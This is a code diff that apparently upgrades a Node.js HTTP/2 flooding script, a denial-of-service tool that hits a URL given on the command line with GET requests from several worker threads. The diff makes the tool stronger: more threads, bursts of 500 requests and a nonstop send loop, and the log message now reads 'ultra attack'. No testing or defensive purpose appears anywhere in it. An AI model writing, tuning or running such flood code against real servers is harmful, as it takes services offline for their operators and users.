@@ -1,8 +1,8 @@
 const http2 = require('http2');
-const { Worker, isMainThread, parentPort, workerData } = require('worker_threads');
+const { Worker, isMainThread, workerData } = require('worker_threads');
 const { cpus } = require('os');
 
-const THREADS = Math.min(6, cpus().length);
+const THREADS = Math.min(8, cpus().length);
 
 if (isMainThread) {
     if (process.argv.length < 4) {
@@ -11,9 +11,9 @@ if (isMainThread) {
     }
 
     const target = process.argv[2];
-    const duration = parseInt(process.argv[3]);
+    const duration = parseInt(process.argv[3], 10);
 
-    console.log(`Launching attack on ${target} for ${duration}s with ${THREADS} threads...`);
+    console.log(`Launching ultra attack on ${target} for ${duration}s with ${THREADS} threads...`);
 
     for (let i = 0; i < THREADS; i++) {
         new Worker(__filename, { workerData: { target, duration } });
@@ -22,35 +22,27 @@ if (isMainThread) {
     const { target, duration } = workerData;
     const end = Date.now() + duration * 1000;
 
-    function startFlood(client) {
-        const interval = setInterval(() => {
-            if (Date.now() > end) return clearInterval(interval);
-            if (client.destroyed || client.closed) return;
+    function flood(client) {
+        const send = () => {
+            if (Date.now() > end || client.closed || client.destroyed) return;
 
-            try {
-                for (let i = 0; i < 100; i++) {
-                    const req = client.request({ ':path': '/', ':method': 'GET' });
-                    req.on('error', () => {});
-                    req.end();
-                }
-            } catch (err) {
-                // Ignore errors from dead sessions
+            for (let i = 0; i < 500; i++) {
+                const req = client.request({ ':path': '/', ':method': 'GET' });
+                req.on('error', () => {});
+                req.end();
             }
-        }, 0);
+
+            setImmediate(send); // burn CPU nonstop
+        };
+        send();
     }
 
-    function createConnection() {
-        let client;
-        try {
-            client = http2.connect(target);
-        } catch (err) {
-            return setTimeout(createConnection, 100);
-        }
-
+    function start() {
+        const client = http2.connect(target);
         client.on('error', () => {});
-        client.on('close', () => setTimeout(createConnection, 100));
-        client.on('connect', () => startFlood(client));
+        client.on('connect', () => flood(client));
+        client.on('close', () => setTimeout(start, 100));
     }
 
-    for (let i = 0; i < 10; i++) createConnection();
+    start();
 }
